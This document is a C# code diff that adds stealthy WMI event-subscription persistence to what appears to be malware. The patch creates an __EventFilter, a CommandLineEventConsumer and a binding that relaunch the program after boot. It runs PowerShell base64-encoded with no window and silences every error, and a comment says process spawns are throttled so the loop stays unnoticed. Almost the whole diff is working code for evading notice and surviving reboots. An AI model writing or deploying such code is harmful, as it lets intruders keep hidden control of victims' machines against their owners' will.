@@ -599,7 +599,8 @@ internal static partial class Persistence
         // Rate-limited to once per 90 seconds so the spawn is not visible as a process loop.
         bool needsPersist = (Config.PersistRegistry && !IsRegistryInstalled(name))
                          || (Config.PersistStartup  && !IsStartupInstalled(name))
-                         || (Config.PersistTask     && !IsTaskInstalled(name));
+                         || (Config.PersistTask     && !IsTaskInstalled(name))
+                         || (Config.PersistWmi      && !IsWmiInstalled(name));
         if (needsPersist && (DateTime.UtcNow - _lastWorkerSpawn).TotalSeconds >= 90)
         {
             _lastWorkerSpawn = DateTime.UtcNow;
@@ -612,6 +613,105 @@ internal static partial class Persistence
                     ["SERO_GUARDIAN"]                 = null,
                 });
         }
+    }
+
+    // ── WMI event subscription ───────────────────────────────────────────────
+    // root\subscription: __EventFilter triggers every 60 s after 200 s uptime,
+    // CommandLineEventConsumer re-runs the stub. Requires admin.
+
+    public static void InstallWmi(string name)
+    {
+        try
+        {
+            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
+            if (string.IsNullOrEmpty(selfPath)) return;
+            var safePath = selfPath.Replace("'", "''");
+            var script = $@"
+$ns = 'ROOT\subscription'
+$n  = '{name}'
+$q  = ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320""
+try {{
+    $f = ([wmiclass]""$ns`:__EventFilter"").CreateInstance()
+    $f.Name           = $n
+    $f.EventNamespace = 'root\cimv2'
+    $f.QueryLanguage  = 'WQL'
+    $f.Query          = $q
+    $f.Put() | Out-Null
+    $c = ([wmiclass]""$ns`:CommandLineEventConsumer"").CreateInstance()
+    $c.Name                = $n
+    $c.CommandLineTemplate = '{safePath}'
+    $c.Put() | Out-Null
+    $b = ([wmiclass]""$ns`:__FilterToConsumerBinding"").CreateInstance()
+    $b.Filter   = $f.__PATH
+    $b.Consumer = $c.__PATH
+    $b.Put() | Out-Null
+}} catch {{}}
+";
+            RunPs(script);
+        }
+        catch { }
+    }
+
+    public static void RemoveWmi(string name)
+    {
+        try
+        {
+            var script = $@"
+$ns = 'ROOT\subscription'; $n = '{name}'
+try {{ gwmi -Namespace $ns -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
+    Where-Object {{ $_.Filter -like ""*Name='{name}'*"" }} | Remove-WmiObject }} catch {{}}
+try {{ gwmi -Namespace $ns -Class CommandLineEventConsumer -Filter ""Name='$n'"" -ErrorAction SilentlyContinue | Remove-WmiObject }} catch {{}}
+try {{ gwmi -Namespace $ns -Class __EventFilter -Filter ""Name='$n'"" -ErrorAction SilentlyContinue | Remove-WmiObject }} catch {{}}
+";
+            RunPs(script);
+        }
+        catch { }
+    }
+
+    public static bool IsWmiInstalled(string name)
+    {
+        try
+        {
+            var psi = new System.Diagnostics.ProcessStartInfo
+            {
+                FileName               = "powershell.exe",
+                Arguments              = $"-NonInteractive -NoProfile -Command \"(gwmi -Namespace ROOT\\\\subscription -Class __EventFilter -Filter \\\"Name='{name}'\\\" -ErrorAction SilentlyContinue) -ne $null\"",
+                RedirectStandardOutput = true,
+                RedirectStandardError  = true,
+                UseShellExecute        = false,
+                CreateNoWindow         = true,
+            };
+            using var proc = System.Diagnostics.Process.Start(psi);
+            if (proc == null) return false;
+            var outTask = System.Threading.Tasks.Task.Run(() => proc.StandardOutput.ReadToEnd());
+            proc.WaitForExit(8000);
+            return outTask.Result.Trim().Equals("True", StringComparison.OrdinalIgnoreCase);
+        }
+        catch { return false; }
+    }
+
+    private static (int code, string output) RunPs(string script)
+    {
+        try
+        {
+            var encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(script));
+            var psi = new System.Diagnostics.ProcessStartInfo
+            {
+                FileName               = "powershell.exe",
+                Arguments              = $"-NonInteractive -NoProfile -EncodedCommand {encoded}",
+                RedirectStandardOutput = true,
+                RedirectStandardError  = true,
+                UseShellExecute        = false,
+                CreateNoWindow         = true,
+            };
+            using var proc = System.Diagnostics.Process.Start(psi);
+            if (proc == null) return (-1, "null proc");
+            var outTask = System.Threading.Tasks.Task.Run(() => proc.StandardOutput.ReadToEnd());
+            var errTask = System.Threading.Tasks.Task.Run(() => proc.StandardError.ReadToEnd());
+            proc.WaitForExit(15000);
+            return (proc.ExitCode, outTask.Result.Trim());
+        }
+        catch (Exception ex) { return (-1, ex.Message); }
     }
 
     // ── Check methods ────────────────────────────────────────────────────────
